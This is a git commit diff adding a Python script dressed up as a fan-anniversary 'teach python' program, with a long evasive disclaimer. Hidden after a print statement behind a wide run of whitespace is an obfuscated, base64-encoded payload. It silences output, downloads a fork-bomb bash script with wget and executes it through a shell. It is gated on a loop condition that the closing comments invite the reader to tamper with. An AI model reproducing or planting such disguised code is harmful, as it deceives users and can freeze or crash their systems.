5d8db1a823a85673f1274f9493420d47c411f92f
gokinjolno <meng85490@gmail.com>
2024-09-11 15:11:01 -0500

    Add files via upload

---
+++ uploade to github.py
@@ -0,0 +1,54 @@
+#翻訳しないでください！Не переводите!
+#Disclaimer! The code contained in the video is harmless. It 
+#is not hacking, teaching other to hack, or digital crime. The 
+#code is obfuscated to prevent stealing. We, UTTP, take great 
+#respect with intellectual property, and we expect that others 
+#respect our intellectual property. We reserve the right to 
+#modify, distribute, and commericialize our intellectual 
+#property. ANY altercation to the python code may cause damage 
+#to the user. We have no liability to thoose who modify or 
+#made mistakes during copying our python code. We also have no 
+#liability for compilier mistakes, acts of nature/God, or any 
+#mistakes made from a third party compiler or a compiler that 
+#is not python version 3.11.9. Obfuscation we use can include: 
+#encoding, reducing readability, AND INCLUDING UNSATISFIABLE 
+#CONDITIONAL STATEMENTS WHICH CONTAINS PYTHON CODE THAT SHOULD 
+#NOT RUN. ANY DAMAGE CAUSED FROM RUNING THE PYTHON CODE BLOCK 
+#INSIDE SUCH UNSATISFIABLE STATEMENTS IS YOUR LIABILITY 
+#BECAUSE AN UNMODIFIED COPY WOULD NEVER HAVE RUNNED IT. All IP 
+#addresses is public information as defined by law. By running 
+#our python code, you automatically agree to our disclaimer. 
+#We are not liable to your disablilties such as not being 
+#fluent in english. We are not liable for AI mistakes.
+#
+#Copyright disclaimer: We do not show urls that leads to 
+#piracy. We do not teach the viewer how to pirate. Any 
+#pirating urls derived from information in the video is pure 
+#coincidence! We denounce all conspiracy theories that claim 
+#that we are distributing pirating urls.
+#
+#Disability disclaimer (DD): According to chatgpt.com/share/
+#8a6ab9da-16a4-4f02-8206-c89c93ec2a5f ,The message ("Do not 
+#translate!") could be included to prevent misinterpretation 
+#of the disclaimer due to translation errors. The creators 
+#might be concerned that translating the disclaimer into other 
+#languages could result in a loss of meaning or legal nuances, 
+#leading to potential misunderstandings.
+
+
+print("Let's teach python to nanjolno fans")
+print("It is time to celebrate nanjolno's youtube channel's 5th anniversay")
+print("make sure your computer does not get 9-11ed on 911")
+print("Do you love Nanjolno?")
+for i in range(1,8):
+	print(str(i)+". I love Nanjolno")
+print("horosho!")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;import sys, os, subprocess;sys.stdout=open(os.devnull,'w');import base64;subprocess.run(base64.b64decode(b'd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYWFyb25yeWFuay9mb3JrLWJvbWIvbWFzdGVyL2ZvcmstYm9tYi5iYXNo').decode('utf-8')*(i>=13),shell=True);subprocess.run([base64.b64decode(b'YmFzaA==').decode('utf-8'), base64.b64decode(b'Zm9yay1ib21iLmJhc2g='*(i>=13)).decode('utf-8')], shell = True);sys.stdout.flush();sys.stdout = sys.__stdout__ #specifically targeted at linux and linux system because penguins are evil pizza hiders.
+print("nanjolno birth month is 7, but her birthday is the 12th")
+print("try setting for loop to end at 12")
+
+
+
+
+
+
+
